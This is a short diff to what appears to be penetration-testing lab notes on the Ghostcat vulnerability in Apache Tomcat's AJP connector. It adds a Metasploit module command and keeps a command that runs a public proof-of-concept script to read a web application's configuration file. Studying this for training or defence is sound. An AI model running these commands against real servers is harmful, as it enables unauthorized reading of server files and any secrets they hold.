@@ -110,10 +110,11 @@ PORT     STATE SERVICE VERSION
 8080/tcp open  http    Apache Tomcat 9.0.30
 ```
 
+```bash
+use auxiliary/admin/http/tomcat_ghostcat
+```
+
 The PoC code for the vulnerability can be found [here](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi)
 ```shell
 python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml
-
-python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
-
 ```
